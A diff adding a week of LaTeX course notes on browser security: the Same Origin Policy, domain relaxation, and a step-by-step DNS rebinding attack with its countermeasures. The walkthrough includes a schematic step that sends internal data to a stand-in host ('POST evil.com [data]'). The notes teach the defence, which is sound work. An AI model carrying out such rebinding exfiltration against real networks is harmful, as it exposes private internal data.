@@ -2217,4 +2217,80 @@
                 Polyglots can not only bypass content-based filtering rules, but can lead to bypassing the content security policy.
                 Consider a script that checks if the uploaded file is a valid image, and then saves it at ~http://example.com/images/~, if an attacker was to upload a polyglot (which is also a PNG) named ~attack.html~, it would be available at ~http://example.com/images/attack.html~, giving the attacker control of code in the ~http://example.com/~ origin.
                 A response header can be used to prevent sniffing; ~X-Content-Type-Options: nosniff~.
+        \subsection*{Week 6}
+            \subsubsection*{Same Origin Policy}
+                The Same Origin Policy is a key security policy in the browser.
+                Note that the URL denotes the origin (with the scheme, host / IP, and port).
+                Most resources in a page are associated to the origin they are loaded from, but some may be associated to the page itself (such as some scripts).
+                \medskip
+
+                If a page is on ~http://example.com~, any stylesheets and scripts are assumed to have the same origin.
+                However, if we have an iframe, for example from ~http://site2.com~ (which in this case contains a form and an image) - the form and iframe itself will be given an origin from ~site2~.
+                If an image is loaded in the iframe, for example from a CDN such as ~https://cdn.external.com~, the bits that form the image have an image from the CDN.
+                Therefore, a script that was loaded in the main site cannot read the pixels that form the image in the iframe.
+                \medskip
+
+                The main goal of the SOP is to isolate resources of pages loaded from different origins and prevent direct access to functions / variables defined in scripts of different origins (even if they are in the same browser window).
+                Pages in different browsing contexts can only interact with each other if they have the same origin.
+                Persistent resources, such as cookies, are associated to origins (and can only be accessed by pages from that origin).
+                This can be made more fine grained, either more restrictive with CSP or less restrictive with CORS.
+                \medskip
+
+                DNS rebinding involves confusing the victim's browser into believing that two sites (one controlled by the attacker, the other an internal target with valuable information) are in the same origin, allowing for the data to be exfiltrated.
+                For simplicity, assume that the corporate network (inside dashed lines) is behind a firewall;
+                \begin{center}
+                    \begin{tikzpicture}[y=0.5cm, x=1cm]
+                        \draw[very thick, red] (0, 0) -- (3, 0) -- (3, -5) -- (0, -5) -- cycle;
+                        \draw[very thick, red] (0, -6) -- (3, -6) -- (3, -11) -- (0, -11) -- cycle;
+                        \draw[very thick, dashed] (7, 0) -- (18, 0) -- (18, -11) -- (7, -11) -- cycle;
+                        \draw[very thick] (7.5, -0.5) -- (10.5, -0.5) -- (10.5, -10.5) -- (7.5, -10.5) -- cycle;
+                        \draw[very thick] (14.5, -0.5) -- (17.5, -0.5) -- (17.5, -10.5) -- (14.5, -10.5) -- cycle;
+                        \draw
+                        (3, -1.25) edge[very thick, <-, above] node{(1)} (7.5, -1.25)
+                        (3, -1.75) edge[very thick, ->] (7.5, -1.75)
+                        (3, -3.25) edge[very thick, <-, above] node{(3)} (7.5, -3.25)
+                        (3, -3.75) edge[very thick, ->] (7.5, -3.75)
+                        (3, -7.25) edge[very thick, <-, above] node{(2)} (7.5, -7.25)
+                        (3, -7.75) edge[very thick, ->] (7.5, -7.75)
+                        (3, -9.25) edge[very thick, <-, above] node{(5)} (7.5, -9.25)
+                        (3, -9.75) edge[very thick, ->] (7.5, -9.75)
+                        (10.5, -5.25) edge[very thick, ->, above] node{(4)} (14.5, -5.25)
+                        (10.5, -5.75) edge[very thick, <-] (14.5, -5.75);
+
+                        \node at (1.5, -0.5) {DNS server};
+                        \node at (1.5, -6.5) {web server};
+                        \node at (1.5, -10.5) {~123.45.67.89~};
+                        \node at (9, -1.5) {\shortstack{victim's\\browser}};
+                        \node at (16, -1.5) {\shortstack{internal\\web server}};
+                        \node at (16, -10) {~192.168.0.2~};
+                    \end{tikzpicture}
+                \end{center}
+                \begin{enumerate}[(1)]
+                    \itemsep0em
+                    \item the victim's browser contacts the DNS server to resolve ~attacker.com~; the attacker controlled DNS server replies with the attacker's IP address and a short TTL (this is important later); ~123.45.67.89 TTL=0~ (this is stored in the local cache, but will expire)
+                    \item the browser then navigates to the attacker's web server ~GET attacker.com~, which replies with a malicious script ~<script> evil() </script>~ - the script, after some time, will make another request to ~attacker.com~
+                    \item since the entry has expired in the cache, it will attempt to resolve ~attacker.com~ with the DNS server; however it now replies with the IP of the internal web server ~192.168.0.2~
+                    \item the victim makes a request to the internal web server ~GET private\_data~, and the internal web server replies with ~data~
+                    \item finally, this is then sent back to the attacker in another request ~POST evil.com [data]~
+                \end{enumerate}
+                A countermeasure for this is to prevent bindings from changing too quickly with \textbf{DNS pinning} - however this is only a partial mitigation as this can be used legitimately.
+                Another approach is to prevent external DNS queries from resolving internal addresses.
+                \medskip
+
+                SOP prevents pages from different origins from tampering with each other at a JavaScript level (accessing functions and variables cross origin).
+                However, some access is given by default; ~window.location.href~ can only be written to, and some properties such as ~window.frames~, ~window.parent~, ~window.top~, etc. can only be read from.
+                Additionally, some call methods are allowed.
+                \medskip
+
+                However, SOP does not prevent outbound communication (it can be trivial to add messages from the source to the target in an image tag).
+                It also doesn't prevent bidirectional communication; for example, the source site could add a message to a script tag, and the server replies with JavaScript that contains messages.
+                \medskip
+
+                Two subdomains can share resources if they both perform \textbf{domain relaxation}.
+                For example, pages on ~sub1.example.com~ and ~sub2.example.com~ can set the document domain to be ~example.com~ (SOP now allows both these pages to communicate).
+                However, since the domain is now ~example.com~, it cannot communicate with a page at ~sub1.example.com~ (if the second page doesn't also relax the host).
+                Another note is that ~example.com~ cannot communicate with the relaxed domains, until it also relaxes itself.
+                Therefore, the really consists of a scheme, a host, a port, and a flag of whether the domain is relaxed.
+            \subsubsection*{Scripting Attacks}
+            \subsubsection*{Browser Storage}
 \end{document}
